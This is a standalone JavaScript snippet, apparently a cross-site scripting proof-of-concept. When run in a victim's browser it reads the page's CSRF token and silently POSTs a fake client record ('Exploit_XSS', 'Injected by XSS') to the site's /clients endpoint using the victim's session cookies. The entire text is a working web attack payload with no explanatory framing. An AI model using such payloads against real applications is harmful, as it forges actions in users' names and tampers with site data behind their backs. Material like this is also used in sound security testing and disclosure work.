(function () {
  const tokenInput = document.querySelector('input[name="_token"]');
  if (!tokenInput) return;

  const token = tokenInput.value;

  const data = {
    client_name: "Exploit_XSS",
    new_activity: "",
    email: "exploit@xss.com",
    language_id: 1,
    "phone_number[5]": "0606060606",
    "phone_type[5]": "mobile",
    address: "Injected by XSS",
    societeinfo_id: "",
    _token: token
  };

  fetch("/clients", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    credentials: "include",
    body: JSON.stringify(data)
  });
})();
